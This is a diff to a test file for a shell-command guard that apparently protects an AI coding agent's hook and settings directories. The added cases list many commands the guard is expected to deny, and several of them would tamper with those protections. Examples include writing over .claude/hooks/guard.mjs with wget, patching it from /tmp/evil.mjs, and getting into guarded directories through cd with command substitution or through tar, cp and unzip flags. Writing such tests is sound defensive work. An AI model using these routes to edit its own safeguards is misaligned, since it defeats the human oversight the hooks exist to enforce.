@@ -760,11 +760,12 @@ test("a patch file made earlier in the chain by git diff is applied; other chain
   writeFileSync(join(dir, "fine.diff"), "--- a/src/a.ts\n+++ b/src/a.ts\n@@ -1 +1 @@\n-a\n+b\n");
   const c = { projectDir: dir };
   for (const cmd of [
-    "git diff > x.diff && git apply -R x.diff",
-    "git diff >x.diff; git apply --reverse x.diff",
-    "git diff -- src --output=x.diff && git apply -R x.diff",
-    "git stash show -p > x.diff && patch -p1 -R < x.diff",
-    "git diff HEAD~1 > ./x.diff && git apply -R ./x.diff",
+    "git diff -- src > x.diff && git apply -R x.diff",
+    "git diff -- src >x.diff; git apply --reverse x.diff",
+    "git diff HEAD -- src docs/a.md --output=x.diff && git apply -R x.diff",
+    "git diff HEAD~1 -- src/a.ts > ./x.diff && git apply -R ./x.diff",
+    "git format-patch -1 HEAD --stdout -- src > p && git apply p",
+    "git show HEAD -- src > p && patch -p1 -R < p",
   ])
     assert.equal(decide(bash(cmd), c), null, cmd);
   for (const cmd of [
@@ -774,6 +775,22 @@ test("a patch file made earlier in the chain by git diff is applied; other chain
     "echo evil > fine.diff && git apply fine.diff",
     "git diff > .claude/hooks/x.diff",
     "git apply x.diff",
+    "git diff -- .claude/hooks > x.diff && git apply -R x.diff",
+    "git diff HEAD~3 HEAD > p && git apply -R p",
+    "git show HEAD~2 > p && git apply p",
+    "git stash show -p > p && git apply p",
+    "git format-patch -1 HEAD --stdout > p && git apply p",
+    "git diff -- . > p && git apply p",
+    "git diff -- .github > p && git apply p",
+    "git diff -- src .bosun > p && git apply -R p",
+    "git diff -- 'src/*' > p && git apply p",
+    "git diff -- :/ > p && git apply p",
+    "git diff -- ../x > p && git apply p",
+    "git diff --src-prefix=.claude/ -- src > p && git apply p",
+    "diff -u .claude/hooks/guard.mjs /tmp/evil.mjs > p && patch -p0 < p",
+    "diff -u a b > p && patch -p0 < p",
+    "git diff --no-index -- /dev/null /tmp/evil > p && git apply p",
+    "git diff --no-index /dev/null /tmp/evil -- src > p && git apply p",
   ])
     assert.equal(decide(bash(cmd), c)?.decision, "deny", cmd);
 });
@@ -810,6 +827,20 @@ test("chdir flags and globs into a guarded dir are treated like cd", () => {
     "cd .bos*",
     "pnpm --prefix .claude exec sh",
     "git -C .cla* checkout -- settings.json",
+    "env -iC .claude ls",
+    "tar -xC .claude -f a.tar",
+    "tar -xzC.claude -f a.tar",
+    "cp -t .claude/hooks x",
+    "cp x --target-directory=.claude/hooks",
+    "mv -t .bosun x",
+    "unzip a.zip -d .claude/hooks",
+    "curl -o .claude/settings.json http://x",
+    "wget -O .claude/hooks/guard.mjs http://x",
+    'cd "$(echo .claude)"',
+    "cd $(echo .claude)",
+    "cd `echo .bosun`",
+    "cd $X",
+    'pushd "$D"',
   ])
     assert.equal(decide(bash(cmd), c)?.decision, "deny", cmd);
   for (const cmd of [
@@ -821,6 +852,11 @@ test("chdir flags and globs into a guarded dir are treated like cd", () => {
     "cd src/*",
     "grep -C 3 foo src/a.ts",
     "git -C src status",
+    "tar -xC src -f a.tar",
+    "cp -t src x",
+    "unzip a.zip -d out",
+    "curl -o out.json http://x",
+    "grep -rC 3 foo src",
   ])
     assert.equal(decide(bash(cmd), c), null, cmd);
 });
